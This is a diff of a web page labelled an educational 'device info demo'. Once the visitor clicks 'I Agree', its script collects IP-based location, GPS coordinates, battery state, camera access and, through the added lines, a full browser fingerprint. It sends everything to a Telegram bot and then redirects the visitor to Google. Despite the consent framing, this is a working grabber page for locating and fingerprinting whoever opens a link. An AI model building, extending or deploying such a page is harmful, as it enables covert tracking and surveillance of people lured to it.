@@ -1,12 +1,15 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8" />
   <title>Device Info Demo</title>
-  <meta charset="UTF-8">
 </head>
 <body>
   <h2>This website is for educational purposes only.</h2>
-  <p>It demonstrates how websites can collect device info ethically and with user consent.</p>
+  <p>
+    It demonstrates how websites can collect device information ethically and with user consent.
+    No data will be collected until you click "I Agree".
+  </p>
   <button id="agreeBtn">I Agree</button>
 
   <script>
@@ -23,10 +26,19 @@
         battery: "Unknown",
         charging: "Unknown",
         location: "Denied",
-        camera: "Not Attempted"
+        camera: "Not Attempted",
+        browser: "",
+        language: "",
+        platform: "",
+        cookies: "",
+        touch: "",
+        screen: "",
+        timezone: "",
+        memory: "",
+        cpu: ""
       };
 
-      // Get IP info from ipinfo.io using your token
+      // IP info
       try {
         const ipRes = await fetch(`https://ipinfo.io/json?token=${ipToken}`);
         const ipData = await ipRes.json();
@@ -38,7 +50,7 @@
         console.error("IP info error:", e);
       }
 
-      // Get battery info
+      // Battery
       try {
         const battery = await navigator.getBattery();
         data.battery = (battery.level * 100).toFixed(0) + "%";
@@ -47,7 +59,7 @@
         console.error("Battery info error:", e);
       }
 
-      // Get geolocation
+      // Geolocation
       try {
         const position = await new Promise((res, rej) => {
           navigator.geolocation.getCurrentPosition(res, rej);
@@ -57,12 +69,27 @@
         data.location = "Denied or Unavailable";
       }
 
-      // Try camera access
+      // Camera access
       try {
         await navigator.mediaDevices.getUserMedia({ video: true });
         data.camera = "Access Granted";
       } catch (e) {
         data.camera = "Access Denied";
+      }
+
+      // Browser/device info
+      try {
+        data.browser = navigator.userAgent;
+        data.language = navigator.language;
+        data.platform = navigator.platform;
+        data.cookies = navigator.cookieEnabled ? "Enabled" : "Disabled";
+        data.touch = 'ontouchstart' in window ? "Yes" : "No";
+        data.screen = `${screen.width}x${screen.height}, ${screen.colorDepth}bit`;
+        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        data.memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable";
+        data.cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unavailable";
+      } catch (e) {
+        console.error("Browser info error:", e);
       }
 
       return data;
@@ -73,17 +100,28 @@
 🔐 *User Device Info*
 🌐 IP: ${data.ip}
 📍 Location: ${data.city}, ${data.region}, ${data.country}
-🔋 Battery: ${data.battery} | Charging: ${data.charging}
 📡 GPS: ${data.location}
 📷 Camera: ${data.camera}
+
+🖥 *Device Specs*
+💻 Platform: ${data.platform}
+📱 Touch Support: ${data.touch}
+🧠 CPU Cores: ${data.cpu}
+💾 RAM: ${data.memory}
+🖼 Screen: ${data.screen}
+🌍 Language: ${data.language}
+🌐 Browser: ${data.browser}
+🍪 Cookies: ${data.cookies}
+🕒 Timezone: ${data.timezone}
+
+🔋 Battery: ${data.battery} | Charging: ${data.charging}
       `;
+
       const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
       fetch(url, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
           text: message,
@@ -96,7 +134,7 @@
       const info = await getDeviceInfo();
       sendToTelegram(info);
       setTimeout(() => {
-        window.location.href = "https://google.com"; // Redirect
+        window.location.href = "https://www.google.com";
       }, 3000);
     });
   </script>
